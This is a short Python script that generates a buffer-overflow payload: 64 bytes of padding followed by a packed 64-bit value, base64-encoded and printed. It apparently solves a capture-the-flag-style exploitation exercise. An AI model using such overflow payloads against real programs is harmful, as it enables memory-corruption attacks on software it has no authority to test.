
import sys
import struct
import base64

buf = b'vvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvv'
buf += struct.pack('<Q', 11157863880342300778)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
